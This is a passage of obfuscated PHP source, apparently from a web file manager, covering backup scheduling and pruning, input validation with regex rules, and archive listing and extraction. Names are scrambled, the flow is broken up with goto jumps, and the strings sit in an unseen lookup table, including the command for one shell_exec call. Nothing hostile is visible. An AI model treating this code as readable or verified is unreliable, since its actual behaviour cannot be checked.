$eïà†‚¡‡é; break; } } $d®‘ËŒ¢…[] = $dÀÛ½Ê °; $fÊÍö¹ô°˜ = $DŞÉ”ó¦š•[681]; } $B¡˜›·Óî÷ = 2; goto f÷ŒœŞ°³; fØ“‡œÂî»: } public function tkxm9c59e236($D¹‡Éò»ºÊ, $E§ºğˆŸâ) { $c†Ê£‚À® =& $_SERVER[ºÖÙÂŒäÉê‡]; $e­é–Å…õ° =& $_SERVER[‘Ûª¥Ç…]; return $e­é–Å…õ°[13](array($e­é–Å…õ°[14], $e­é–Å…õ°[344]), $D¹‡Éò»ºÊ, $E§ºğˆŸâ); $fÅÖì‚ÑÓß = $c†Ê£‚À®[682]; if (strlen($fÅÖì‚ÑÓß) < $c†Ê£‚À®[561]) { die; } } public function mwfz68573493($C‰æšªİŸ», $B‘ŠÁöÜæ¦) { $E†×£òêÌÉ =& $_SERVER[‘Ûª¥Ç…]; return $E†×£òêÌÉ[13](array($E†×£òêÌÉ[345], $E†×£òêÌÉ[346]), $C‰æšªİŸ», $B‘ŠÁöÜæ¦); } public function usrdf04e6a41($dó¸ æÛø, $AœÎÛÁ­¾Œ) { $DÚ©¨¿×¦ =& $_SERVER[‘Ûª¥Ç…]; return $DÚ©¨¿×¦[13](array($DÚ©¨¿×¦[345], $DÚ©¨¿×¦[347]), $dó¸ æÛø, $AœÎÛÁ­¾Œ); $FÖŠœÕİŒ… = $_SERVER[ºÖÙÂŒäÉê‡][683]; } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $c±ˆ‘Šæ·ß =& $_SERVER[ºÖÙÂŒäÉê‡]; self::$name = date($c±ˆ‘Šæ·ß[684]); if (!($f öÊ®ëÆ­ = Model($c±ˆ‘Šæ·ß[685])->lastItem())) { $f öÊ®ëÆ­ = $this->initData(); } else { self::$name = $f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[28]]; if ($f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[686]] == $c±ˆ‘Šæ·ß[83]) { self::$name = date($c±ˆ‘Šæ·ß[687]); $aµ‹¬‹à  = 0; if (isset($f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[286]][$c±ˆ‘Šæ·ß[163]][$c±ˆ‘Šæ·ß[423]])) { $aµ‹¬‹à  = (int) $f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[286]][$c±ˆ‘Šæ·ß[163]][$c±ˆ‘Šæ·ß[423]]; } if ($f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[28]] == self::$name) { Model($c±ˆ‘Šæ·ß[685])->remove($f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[372]]); } $f öÊ®ëÆ­ = $this->initData($aµ‹¬‹à , $f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[688]]); } else { $this->checkStore($f öÊ®ëÆ­[$c±ˆ‘Šæ·ß[688]]); } } self::$option = $f öÊ®ëÆ­; } private function initData($FÃÊó·“ = 0, $D†ë«š…À = '') { goto EÉ‹±éŒôê; e§ÜÆÕë‹É: $b¹®ä…¾¹‰[$FºÉ¾Œ’—[372]] = $b±¹±³¯ˆ; return $b¹®ä…¾¹‰; goto e½äîİÙŞ; EÉ‹±éŒôê: $FºÉ¾Œ’— =& $_SERVER[ºÖÙÂŒäÉê‡]; $e×Í–ô«˜ê = Model($FºÉ¾Œ’—[685])->config(); if ($D†ë«š…À && $e×Í–ô«˜ê[$FºÉ¾Œ’—[688]] != $D†ë«š…À) { $FÃÊó·“ = 0; } goto CáôØä–ÕÇ; CáôØä–ÕÇ: $this->checkStore($e×Í–ô«˜ê[$FºÉ¾Œ’—[688]]); $b¹®ä…¾¹‰ = array($FºÉ¾Œ’—[688] => $e×Í–ô«˜ê[$FºÉ¾Œ’—[688]], $FºÉ¾Œ’—[28] => self::$name, $FºÉ¾Œ’—[686] => 0, $FºÉ¾Œ’—[689] => $e×Í–ô«˜ê[$FºÉ¾Œ’—[689]], $FºÉ¾Œ’—[286] => array($FºÉ¾Œ’—[690] => array($FºÉ¾Œ’—[686] => 0), $FºÉ¾Œ’—[691] => array($FºÉ¾Œ’—[686] => 0, $FºÉ¾Œ’—[692] => 0, $FºÉ¾Œ’—[693] => 0, $FºÉ¾Œ’—[29] => $FºÉ¾Œ’—[33]), $FºÉ¾Œ’—[694] => array($FºÉ¾Œ’—[686] => 0, $FºÉ¾Œ’—[692] => 0, $FºÉ¾Œ’—[693] => 0), $FºÉ¾Œ’—[163] => array($FºÉ¾Œ’—[686] => 0, $FºÉ¾Œ’—[695] => 0, $FºÉ¾Œ’—[696] => 0, $FºÉ¾Œ’—[697] => 0, $FºÉ¾Œ’—[698] => 0, $FºÉ¾Œ’—[423] => $FÃÊó·“)), $FºÉ¾Œ’—[699] => time(), $FºÉ¾Œ’—[700] => 0); $b±¹±³¯ˆ = Model($FºÉ¾Œ’—[685])->insert($b¹®ä…¾¹‰); goto e§ÜÆÕë‹É; e½äîİÙŞ: } private function checkStore($fƒ’Â¯ŠÔâ) { $b§ÆÒÜ·Íò =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÉ­šÎœ”° = Model($b§ÆÒÜ·Íò[701])->listData($fƒ’Â¯ŠÔâ); Model($b§ÆÒÜ·Íò[701])->checkConfig($EÉ­šÎœ”°); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ºÖÙÂŒäÉê‡][685])->findByName(self::$name); } return self::$option; } public static function set($b¥º±çä×) { $e¿‚Ø§†±˜ =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÈÉèÇ†µ = self::get(); foreach ($b¥º±çä× as $fğØ²Œœ¡ => $BáÔÜŒ«ƒ) { $F¯ô‰ŠÊ£ä = explode($e¿‚Ø§†±˜[91], $fğØ²Œœ¡); $féºÜõáóİ = count($F¯ô‰ŠÊ£ä); switch ($féºÜõáóİ) { case 1: $AÈÉèÇ†µ[$F¯ô‰ŠÊ£ä[0]] = $BáÔÜŒ«ƒ; break; case 2: $AÈÉèÇ†µ[$F¯ô‰ŠÊ£ä[0]][$F¯ô‰ŠÊ£ä[1]] = $BáÔÜŒ«ƒ; break; case 3: $AÈÉèÇ†µ[$F¯ô‰ŠÊ£ä[0]][$F¯ô‰ŠÊ£ä[1]][$F¯ô‰ŠÊ£ä[2]] = $BáÔÜŒ«ƒ; break; } } Model($e¿‚Ø§†±˜[685])->update($AÈÉèÇ†µ[$e¿‚Ø§†±˜[372]], $AÈÉèÇ†µ); self::$option = $AÈÉèÇ†µ; return self::$option; } public function keep() { $F†¬ÔÓŒŠ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C˜ñÒ‘í‹œ = self::get(); if ($C˜ñÒ‘í‹œ[$F†¬ÔÓŒŠ[286]][$F†¬ÔÓŒŠ[690]][$F†¬ÔÓŒŠ[686]] == $F†¬ÔÓŒŠ[83]) { return; } $this->backupKeep($C˜ñÒ‘í‹œ); self::set(array($F†¬ÔÓŒŠ[702] => 1)); } private function backupKeep($c¢ñ’›÷Ì†) { goto DÀº¨Ğ¨¨; c—¶…Ç™ö: $A·½§‘Éè¿ = 0; $cĞ‚–ïº–ç = array(); foreach ($c†Åóğ–— as $Dß‡ó‡“œÌ) { if ($A·½§‘Éè¿ >= 7) { break; } $cĞ‚–ïº–ç[] = $Dß‡ó‡“œÌ[$CÔºñõÊ[28]]; $A·½§‘Éè¿++; } goto CàêÄ‘‚»‚; CàêÄ‘‚»‚: for ($A·½§‘Éè¿ = 0; $A·½§‘Éè¿ < 12; $A·½§‘Éè¿++) { $cĞ‚–ïº–ç[] = date($CÔºñõÊ[703], strtotime("\x2d{$A·½§‘Éè¿}\40\155\x6f\156\164\150\163")); } $cĞ‚–ïº–ç = array_unique($cĞ‚–ïº–ç); foreach ($c†Åóğ–— as $Dß‡ó‡“œÌ) { if (!empty($Dß‡ó‡“œÌ[$CÔºñõÊ[28]]) && in_array($Dß‡ó‡“œÌ[$CÔºñõÊ[28]], $cĞ‚–ïº–ç)) { continue; } Model($CÔºñõÊ[685])->remove($Dß‡ó‡“œÌ[$CÔºñõÊ[372]]); $F‹ÅêŸ¢–¸ = "\173\x69\x6f\72{$c¢ñ’›÷Ì†[$CÔºñõÊ[688]]}\175\x2f\x64\x61\164\x61\x62\141\x73\145\57\142\x61\143\x6b\165\160\137{$Dß‡ó‡“œÌ[$CÔºñõÊ[28]]}"; IO::remove($F‹ÅêŸ¢–¸, !1); } goto b”œé²–ß; DÀº¨Ğ¨¨: $CÔºñõÊ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c†Åóğ–— = Model($CÔºñõÊ[685])->listData(); if (empty($c†Åóğ–—)) { return; } goto c—¶…Ç™ö; b”œé²–ß: } public function db() { goto a¡¦š¹ƒƒ; a¡¦š¹ƒƒ: $D—ã ç×ƒ¯ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d´êáæ³Ö‹ = self::get(); if ($d´êáæ³Ö‹[$D—ã ç×ƒ¯[286]][$D—ã ç×ƒ¯[691]][$D—ã ç×ƒ¯[686]] == $D—ã ç×ƒ¯[83]) { return !0; } goto FÀÍÀÕíáÎ; FÀÍÀÕíáÎ: $aàæéæ’Ê = new BackupDb(); if (!$aàæéæ’Ê->index()) { return !1; } self::set(array($D—ã ç×ƒ¯[704] => 1)); goto Càœ‘Ç‹¦£; Càœ‘Ç‹¦£: return !0; goto c·¾Ã…òë; c·¾Ã…òë: } public function dbFile() { goto fù­·ÑŠç; fù­·ÑŠç: $c³’›ˆõá¬ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bù¤ÓİŒÖ© = self::get(); if ($Bù¤ÓİŒÖ©[$c³’›ˆõá¬[286]][$c³’›ˆõá¬[694]][$c³’›ˆõá¬[686]] == $c³’›ˆõá¬[83]) { return !0; } goto DÌóŠ˜áé ; DÌóŠ˜áé : $b³ò†îÄİ = new BackupDbFile(); if (!$b³ò†îÄİ->index()) { return !1; } self::set(array($c³’›ˆõá¬[705] => 1)); goto a¨“åªÉ‹; a¨“åªÉ‹: return !0; goto B”ÆÍÂêà; B”ÆÍÂêà: } public function file() { $Cƒ£ë¤¡Ì‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Dí£ç…‡‹ = self::get(); if ($Dí£ç…‡‹[$Cƒ£ë¤¡Ì‚[286]][$Cƒ£ë¤¡Ì‚[163]][$Cƒ£ë¤¡Ì‚[686]] == $Cƒ£ë¤¡Ì‚[83]) { return !0; } if (!isset($Dí£ç…‡‹[$Cƒ£ë¤¡Ì‚[689]]) || $Dí£ç…‡‹[$Cƒ£ë¤¡Ì‚[689]] == $Cƒ£ë¤¡Ì‚[472]) { $aª»¬Û²ØÁ = new BackupFile(); if (!$aª»¬Û²ØÁ->index()) { return !1; } } self::set(array($Cƒ£ë¤¡Ì‚[706] => 1, $Cƒ£ë¤¡Ì‚[686] => 1)); return !0; } } $Dì„øÙé´† = LIB_DIR . $_SERVER[ºÖÙÂŒäÉê‡][707]; goto BÆ‰’–ƒŒŒ; a±ÛŸ¦¯¡É: define($_SERVER[ºÖÙÂŒäÉê‡][231], 1); define($_SERVER[ºÖÙÂŒäÉê‡][232], 2); define($_SERVER[ºÖÙÂŒäÉê‡][233], 3); goto AÇÛïª…ÓŒ; f½¹ÑõƒÂÚ: class Input { public static function getArray($cÜ¯«ƒÂ„) { goto d¬ãàÍïÚ; eÕßò„¥¡Ì: $d½›ì¼¯É“ = array(); $dÒñ•Í‚ = LNG($A™ÍŞ§Òù’[1839]); foreach ($cÜ¯«ƒÂ„ as $CßŠ÷Ò®œ½ => $FŠÁÎò¬½) { goto Eã¼±í†Öƒ; Eã¼±í†Öƒ: $F’åª÷‹™¬ = _get($FŠÁÎò¬½, $A™ÍŞ§Òù’[1228], $dÒñ•Í‚ . $A™ÍŞ§Òù’[872] . $CßŠ÷Ò®œ½); $DÀç±¢ãªß = $CßŠ÷Ò®œ½; if (isset($FŠÁÎò¬½[$A™ÍŞ§Òù’[1840]]) && $FŠÁÎò¬½[$A™ÍŞ§Òù’[1840]]) { $DÀç±¢ãªß = $FŠÁÎò¬½[$A™ÍŞ§Òù’[1840]]; } goto Eë¡³“Õ¯; DğÖîİ·à: if (isset($FŠÁÎò¬½[$A™ÍŞ§Òù’[1842]]) && !self::check($in[$CßŠ÷Ò®œ½], $FŠÁÎò¬½[$A™ÍŞ§Òù’[1842]], $fÜøë´Œ×¶)) { if (array_key_exists($A™ÍŞ§Òù’[1841], $FŠÁÎò¬½)) { if (!is_null($FŠÁÎò¬½[$A™ÍŞ§Òù’[1841]])) { $f‘ßç£ƒçï[$DÀç±¢ãªß] = $FŠÁÎò¬½[$A™ÍŞ§Òù’[1841]]; } } else { $d½›ì¼¯É“[] = $F’åª÷‹™¬; } continue; } $f‘ßç£ƒçï[$DÀç±¢ãªß] = $in[$CßŠ÷Ò®œ½]; goto Fâˆ­Ğåî˜; Eë¡³“Õ¯: if (!array_key_exists($CßŠ÷Ò®œ½, $in)) { if (array_key_exists($A™ÍŞ§Òù’[1841], $FŠÁÎò¬½)) { if (!is_null($FŠÁÎò¬½[$A™ÍŞ§Òù’[1841]])) { $f‘ßç£ƒçï[$DÀç±¢ãªß] = $FŠÁÎò¬½[$A™ÍŞ§Òù’[1841]]; } } else { if (isset($FŠÁÎò¬½[$A™ÍŞ§Òù’[1842]])) { $d½›ì¼¯É“[] = $F’åª÷‹™¬; } } continue; } if (isset($FŠÁÎò¬½[$A™ÍŞ§Òù’[1842]]) && $FŠÁÎò¬½[$A™ÍŞ§Òù’[1842]] == $A™ÍŞ§Òù’[287]) { $CªœÀ²Á„… = json_decode($in[$CßŠ÷Ò®œ½], !0); if (is_array($CªœÀ²Á„…)) { $f‘ßç£ƒçï[$DÀç±¢ãªß] = $CªœÀ²Á„…; } else { if (array_key_exists($A™ÍŞ§Òù’[1841], $FŠÁÎò¬½)) { if (!is_null($FŠÁÎò¬½[$A™ÍŞ§Òù’[1841]])) { $f‘ßç£ƒçï[$DÀç±¢ãªß] = $FŠÁÎò¬½[$A™ÍŞ§Òù’[1841]]; } } else { $d½›ì¼¯É“[] = $F’åª÷‹™¬; } } continue; } $fÜøë´Œ×¶ = _get($FŠÁÎò¬½, $A™ÍŞ§Òù’[1001]); goto DğÖîİ·à; Fâˆ­Ğåî˜: } goto F’¼™‚±¹Â; F’¼™‚±¹Â: if (count($d½›ì¼¯É“) > 0) { show_json(implode($A™ÍŞ§Òù’[1843], $d½›ì¼¯É“), !1); } return $f‘ßç£ƒçï; goto eœ»ïÅŞ £; d¬ãàÍïÚ: $A™ÍŞ§Òù’ =& $_SERVER[ºÖÙÂŒäÉê‡]; global $in; $f‘ßç£ƒçï = array(); goto eÕßò„¥¡Ì; eœ»ïÅŞ £: } public static function reg($Cí–ß‘ÌÈ¹ = "\162\x65\x71\x75\151\162\145") { static $FÚô‹Ú½Àœ = array("\162\x65\161\165\x69\162\145" => "\56\53", "\x6e\x75\155\142\145\x72" => "\x5c\144\53", "\x68\x65\170" => "\x5b\60\55\71\101\55\x46\141\55\146\135\53", "\151\156\164" => "\133\x2d\134\x2b\x5d\77\x5c\144\53", "\142\x6f\x6f\x6c" => "\60\174\x31", "\x66\x6c\x6f\141\x74" => "\133\x2d\134\x2b\135\77\134\x64\53\50\x5c\56\134\144\53\x29\x3f", "\x65\x6e\x67\154\151\x73\150" => "\x5b\x41\x2d\132\141\x2d\172\40\135\53", "\143\150\x69\156\145\x73\x65" => "\133\x5c\170\x7b\x34\145\60\60\x7d\x2d\134\170\x7b\x39\x66\141\65\x7d\135\x2b", "\150\x61\x73\x43\150\x69\156\x65\163\145" => "\x2f\50\133\x5c\170\173\64\x65\x30\60\x7d\x2d\134\170\173\71\x66\141\x35\x7d\x5d\x2b\51\57\165", "\x65\155\x61\x69\x6c" => "\x5c\x77\x2b\50\133\134\56\134\55\x5d\x5c\x77\53\51\x2a\134\100\134\x77\x2b\x28\133\x5c\x2e\x5c\x2d\x5d\134\167\x2b\51\52\134\x2e\x5c\x77\x2b", "\160\x68\x6f\x6e\145" => "\x31\x5b\x33\x2d\71\135\x5c\x64\173\71\175", "\164\145\x6c\160\150\157\x6e\145" => "\x28\134\50\x5c\x64\x7b\x33\x2c\64\175\x5c\x29\x7c\134\x64\173\x33\54\64\x7d\x2d\x7c\134\x73\x29\x3f\134\144\x7b\x37\54\61\64\175", "\165\x72\154" => "\50\x68\164\x74\160\174\x66\164\160\x7c\x68\x74\164\160\163\x29\x3a\x5c\x2f\134\57\x5b\x5c\167\134\x2d\137\x5d\x2b\50\134\x2e\x5b\x5c\167\x5c\x2d\137\135\x2b\x29\x2b\x28\x5b\x5c\167\x5c\55\x5c\56\x2c\x40\77\136\75\x25\46\x3a\134\57\x7e\x5c\x2b\43\x5d\52\133\x5c\167\x5c\55\x5c\x40\77\136\75\x25\x26\x5c\57\x7e\134\x2b\43\135\x29\x3f", "\x75\162\154\106\165\x6c\154" => "\x5b\x61\x2d\172\x41\55\172\135\x2b\72\134\x2f\134\x2f\x5b\136\134\163\x5d\52", "\151\160" => "\x28\134\x64\x7b\61\54\x33\175\134\56\51\173\x33\x7d\x28\x5c\144\173\61\x2c\x33\x7d\x29", "\x7a\151\x70" => "\133\x31\55\x39\135\134\x64\x7b\65\175\x28\77\41\134\144\51", "\151\144\103\141\162\x64" => "\50\x5c\144\x7b\61\x35\175\x29\174\x28\134\x64\x7b\x31\x37\x7d\x28\x5c\144\174\130\x7c\170\51\x29", "\143\x6f\154\157\162" => "\43\x28\133\x30\x2d\x39\x41\55\106\141\55\x66\x5d\173\63\x7d\174\133\60\55\x39\x41\x2d\x46\141\x2d\146\135\x7b\x36\x7d\51", "\164\x69\155\145" => "\x28\x5b\x30\x2d\61\135\134\x64\174\x32\133\60\x2d\x34\x5d\51\72\x5b\60\x2d\65\135\x5c\x64", "\x64\x61\x74\145" => "\134\144\173\64\x7d\x5b\x2d\134\x2f\135\77\50\x30\x5b\x31\55\x39\135\x7c\61\133\x30\55\x32\135\51\133\x2d\x5c\57\135\x3f\50\x5b\x30\x2d\x32\135\x5c\144\x7c\63\x5b\x30\55\x31\x5d\x29", "\144\141\164\145\x54\151\x6d\145" => "\x5c\144\x7b\x34\x7d\133\x2d\134\x2f\135\x3f\50\60\x5b\x31\55\71\x5d\x7c\x31\x5b\60\55\x32\x5d\x29\133\x2d\x5c\57\135\x3f\50\x5b\x30\55\62\135\x5c\144\x7c\x33\133\60\55\x31\x5d\51\x5c\x73\53\x28\133\x30\55\x31\135\134\x64\174\x32\133\60\x2d\x34\135\51\72\x5b\x30\x2d\x35\135\134\x64", "\160\x61\x73\163\x77\157\x72\x64" => "\50\77\x3d\x2e\x2a\x5c\x64\51\50\x3f\x3d\56\x2a\x5b\x61\55\x7a\x5d\51\50\77\x3d\x2e\x2a\x5b\101\55\x5a\135\x29\56\x7b\70\x2c\62\60\175", "\153\145\x79" => "\133\x41\55\132\141\x2d\172\60\x2d\x39\137\x5c\55\x5c\x2e\x5d\x2b", "\x6b\145\x79\106\165\154\154" => "\133\x41\x2d\x5a\141\55\x7a\60\x2d\71\137\134\55\x5c\56\134\x73\x2c\x5d\x2b"); if (!$Cí–ß‘ÌÈ¹) { return $FÚô‹Ú½Àœ; } return $FÚô‹Ú½Àœ[$Cí–ß‘ÌÈ¹]; } public static function check($f²ñÅ¸¬É, $CƒŒËÅø›§, $f²ÎªË‡ø– = null) { $Cà‰®ŞÄÊË =& $_SERVER[ºÖÙÂŒäÉê‡]; switch ($CƒŒËÅø›§) { case $Cà‰®ŞÄÊË[7]: return in_array($f²ñÅ¸¬É, $f²ÎªË‡ø–); break; case $Cà‰®ŞÄÊË[1844]: return floatval($f²ñÅ¸¬É) > $f²ÎªË‡ø–; break; case $Cà‰®ŞÄÊË[1845]: return floatval($f²ñÅ¸¬É) < $f²ÎªË‡ø–; break; case $Cà‰®ŞÄÊË[330]: return strlen($f²ñÅ¸¬É) >= $f²ÎªË‡ø–[0] && strlen($f²ñÅ¸¬É) <= $f²ÎªË‡ø–[1]; break; case $Cà‰®ŞÄÊË[330]: if (is_array($f²ÎªË‡ø–)) { return strlen($f²ñÅ¸¬É) >= $f²ÎªË‡ø–[0] && strlen($f²ñÅ¸¬É) <= $f²ÎªË‡ø–[1]; break; } else { return strlen($f²ñÅ¸¬É) == $f²ÎªË‡ø–; break; } case $Cà‰®ŞÄÊË[326]: return floatval($f²ñÅ¸¬É) >= $f²ÎªË‡ø–[0] && floatval($f²ñÅ¸¬É) <= $f²ÎªË‡ø–[1]; break; } $Bãˆ¾Î¹ñ‚ = self::reg(!1); $CƒŒËÅø›§ = isset($Bãˆ¾Î¹ñ‚[$CƒŒËÅø›§]) ? $Bãˆ¾Î¹ñ‚[$CƒŒËÅø›§] : $CƒŒËÅø›§; if (substr($CƒŒËÅø›§, 0, 1) != $Cà‰®ŞÄÊË[8]) { $CƒŒËÅø›§ = $Cà‰®ŞÄÊË[1846] . $CƒŒËÅø›§ . $Cà‰®ŞÄÊË[1847]; } return preg_match($CƒŒËÅø›§, $f²ñÅ¸¬É) === 1; } public static function get($a‘¢îŞ–¾õ, $BÎ¤‹—ÜÅ¾ = null, $dÊ«á»åÌ = null, $dŠˆÌÁİÂ¿ = null) { goto A…£‚ÎÈ™; BÍÓÚºáÊÛ: if (!is_null($dŠˆÌÁİÂ¿)) { $F¸ÄÚœÆ÷ñ[$d¦àÀ«‡Ùê[1001]] = $dŠˆÌÁİÂ¿; } if (!is_null($BÎ¤‹—ÜÅ¾)) { $F¸ÄÚœÆ÷ñ[$d¦àÀ«‡Ùê[1842]] = $BÎ¤‹—ÜÅ¾; } $b¹íî”´Ãã = Input::getArray(array($a‘¢îŞ–¾õ => $F¸ÄÚœÆ÷ñ)); goto BÒØÚÚß; BÒØÚÚß: return $b¹íî”´Ãã[$a‘¢îŞ–¾õ]; goto fùèÂäğÎ…; A…£‚ÎÈ™: $d¦àÀ«‡Ùê =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¸ÄÚœÆ÷ñ = array(); if (!is_null($dÊ«á»åÌ)) { $F¸ÄÚœÆ÷ñ[$d¦àÀ«‡Ùê[34]] = $dÊ«á»åÌ; } goto BÍÓÚºáÊÛ; fùèÂäğÎ…: } } class KodArchive { static function init() { goto aÛ»õ“÷Ï‡; aÛ»õ“÷Ï‡: $B×ƒç¥òÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (defined($B×ƒç¥òÂ[1848])) { return; } define($B×ƒç¥òÂ[1848], SDK_DIR . $B×ƒç¥òÂ[1849]); goto DÍĞçÚ½Ğ»; F«¼®ŒŠè“: require_once ARCHIVE_LIB . $B×ƒç¥òÂ[1859]; goto D˜Ö‡¼ÎŸÀ; Böİª‡“ÇÛ: require_once ARCHIVE_LIB . $B×ƒç¥òÂ[1856]; require_once ARCHIVE_LIB . $B×ƒç¥òÂ[1857]; require_once ARCHIVE_LIB . $B×ƒç¥òÂ[1858]; goto F«¼®ŒŠè“; AĞÅÜ´Äèš: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $B×ƒç¥òÂ[1854]; require_once ARCHIVE_LIB . $B×ƒç¥òÂ[1855]; goto Böİª‡“ÇÛ; DÍĞçÚ½Ğ»: define($B×ƒç¥òÂ[1850], TEMP_FILES); define($B×ƒç¥òÂ[1851], TEMP_FILES); define($B×ƒç¥òÂ[1852], $B×ƒç¥òÂ[1853]); goto AĞÅÜ´Äèš; D˜Ö‡¼ÎŸÀ: } static function checkIfType($Dë•‰òìöæ, $Bõ…·¬½©¾) { goto C·ÉÉì‡»; C·ÉÉì‡»: $bèòƒ•ƒ©Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; self::init(); $fùÏ´³ãÖÏ = array($bèòƒ•ƒ©Ø[306] => array($bèòƒ•ƒ©Ø[306], $bèòƒ•ƒ©Ø[1860], $bèòƒ•ƒ©Ø[1861], $bèòƒ•ƒ©Ø[1862]), $bèòƒ•ƒ©Ø[1863] => array($bèòƒ•ƒ©Ø[1863], $bèòƒ•ƒ©Ø[1864], $bèòƒ•ƒ©Ø[1033], $bèòƒ•ƒ©Ø[1031]), $bèòƒ•ƒ©Ø[1035] => array($bèòƒ•ƒ©Ø[1035], $bèòƒ•ƒ©Ø[1865], $bèòƒ•ƒ©Ø[1866], $bèòƒ•ƒ©Ø[1867], $bèòƒ•ƒ©Ø[1868], $bèòƒ•ƒ©Ø[1869], $bèòƒ•ƒ©Ø[1870])); goto F‰ƒßğ‚ ; DÀÜ‡ŠÖ›²: return $a‚…·¨¶É; goto E¥¦›„‚; F‰ƒßğ‚ : $a‚…·¨¶É = in_array($Dë•‰òìöæ, $fùÏ´³ãÖÏ[$Bõ…·¬½©¾]); if ($a‚…·¨¶É && ($Bõ…·¬½©¾ == $bèòƒ•ƒ©Ø[306] || $Bõ…·¬½©¾ == $bèòƒ•ƒ©Ø[1863]) && (!function_exists($bèòƒ•ƒ©Ø[1871]) || !function_exists($bèòƒ•ƒ©Ø[1872]))) { show_tips($bèòƒ•ƒ©Ø[1873]); } if ($a‚…·¨¶É && $Bõ…·¬½©¾ == $bèòƒ•ƒ©Ø[1035] && (!function_exists($bèòƒ•ƒ©Ø[1874]) || !strstr(shell_exec($bèòƒ•ƒ©Ø[1875]), $bèòƒ•ƒ©Ø[1876]))) { show_tips($bèòƒ•ƒ©Ø[1877]); } goto DÀÜ‡ŠÖ›²; E¥¦›„‚: } static function listContent($A²ç‘ˆ…é±, $dïÅ†ŒÀé = true) { $E–ß¥™Ó“· =& $_SERVER[ºÖÙÂŒäÉê‡]; self::init(); $E¨…ŒË—­í = !empty($GLOBALS[$E–ß¥™Ó“·[1039]]) ? $GLOBALS[$E–ß¥™Ó“·[1039]] : get_path_ext($A²ç‘ˆ…é±); $C¶«ô£ğŸÊ = !1; if (self::checkIfType($E¨…ŒË—­í, $E–ß¥™Ó“·[1863])) { $bîØ¸ÂŒù™ = PclTarList($A²ç‘ˆ…é±, $E¨…ŒË—­í); $C¶«ô£ğŸÊ = array(); for ($AÑ·•¼°éÁ = 0; $AÑ·•¼°éÁ < count($bîØ¸ÂŒù™); $AÑ·•¼°éÁ++) { $Dö•Úñ«©÷ = $bîØ¸ÂŒù™[$AÑ·•¼°éÁ]; if ($Dö•Úñ«©÷[$E–ß¥™Ó“·[1878]] == $E–ß¥™Ó“·[1879] || $Dö•Úñ«©÷[$E–ß¥™Ó“·[1878]] == $E–ß¥™Ó“·[1880]) { continue; } if ($dïÅ†ŒÀé) { $Dö•Úñ«©÷[$E–ß¥™Ó“·[1881]] = ltrim($Dö•Úñ«©÷[$E–ß¥™Ó“·[1881]], $E–ß¥™Ó“·[1137]); } if ($Dö•Úñ«©÷[$E–ß¥™Ó“·[1878]] == $E–ß¥™Ó“·[1882]) { $Dö•Úñ«©÷[$E–ß¥™Ó“·[76]] = !0; } else { $Dö•Úñ«©÷[$E–ß¥™Ó“·[76]] = !1; } $Dö•Úñ«©÷[$E–ß¥™Ó“·[1026]] = $AÑ·•¼°éÁ; $C¶«ô£ğŸÊ[] = $Dö•Úñ«©÷; } } else { if (self::checkIfType($E¨…ŒË—­í, $E–ß¥™Ó“·[1035])) { $Aë¾ğøë¾· = kodRarArchive::listContent($A²ç‘ˆ…é±); if (!$Aë¾ğøë¾·[$E–ß¥™Ó“·[1022]]) { return $Aë¾ğøë¾·; } else { $C¶«ô£ğŸÊ = $Aë¾ğøë¾·[$E–ß¥™Ó“·[1024]]; } } else { if (kodZipArchive::support($E–ß¥™Ó“·[359])) { $C¶«ô£ğŸÊ = kodZipArchive::listContent($A²ç‘ˆ…é±); } else { $FÒã˜Ë‘˜Õ = new PclZip($A²ç‘ˆ…é±); $C¶«ô£ğŸÊ = $FÒã˜Ë‘˜Õ->listContent(); } } } if ($C¶«ô£ğŸÊ) { $BÒÀÜÜ¿×ç = unzip_charset_get($C¶«ô£ğŸÊ); $dïÅ†ŒÀé = $dïÅ†ŒÀé && function_exists($E–ß¥™Ó“·[65]); for ($AÑ·•¼°éÁ = 0; $AÑ·•¼°éÁ < count($C¶«ô£ğŸÊ); $AÑ·•¼°éÁ++) { $C¶«ô£ğŸÊ[$AÑ·•¼°éÁ][$E–ß¥™Ó“·[1881]] = str_replace(array($E–ß¥™Ó“·[1062], $E–ß¥™Ó“·[1883]), $E–ß¥™Ó“·[761], $C¶«ô£ğŸÊ[$AÑ·•¼°éÁ][$E–ß¥™Ó“·[1881]]); if ($dïÅ†ŒÀé) { $C¶«ô£ğŸÊ[$AÑ·•¼°éÁ][$E–ß¥™Ó“·[1881]] = iconv_to($C¶«ô£ğŸÊ[$AÑ·•¼°éÁ][$E–ß¥™Ó“·[1881]], $BÒÀÜÜ¿×ç, $E–ß¥™Ó“·[331]); unset($C¶«ô£ğŸÊ[$AÑ·•¼°éÁ][$E–ß¥™Ó“·[1884]]); } } return array($E–ß¥™Ó“·[1022] => !0, $E–ß¥™Ó“·[1024] => $C¶«ô£ğŸÊ); } else { return array($E–ß¥™Ó“·[1022] => !1, $E–ß¥™Ó“·[1024] => $C¶«ô£ğŸÊ); } } static function extract($Aåß²ÁË•, $Fö²¶Œã™, $Aåä½Êì = "\x2d\x31", &$AÎÎî×â½ = false) { goto c±Šˆ“ÂÒ; Aæµ½œêİ†: if (self::checkIfType($C‹›æê¯À’, $D°¢ÛïŒŒ[1863])) { if ($Aåä½Êì != $D°¢ÛïŒŒ[1021]) { $Eø‘Ì•³ = unzip_pre_name($Eø‘Ì•³); $fÚîÜ¤ÒŠì = unzip_pre_name($fÚîÜ¤ÒŠì); $Cƒ¤ß¦ ¦é = PclTarExtractList($Aåß²ÁË•, array($Eø‘Ì•³), $Fö²¶Œã™, $fÚîÜ¤ÒŠì, $C‹›æê¯À’); } else { $Cƒ¤ß¦ ¦é = 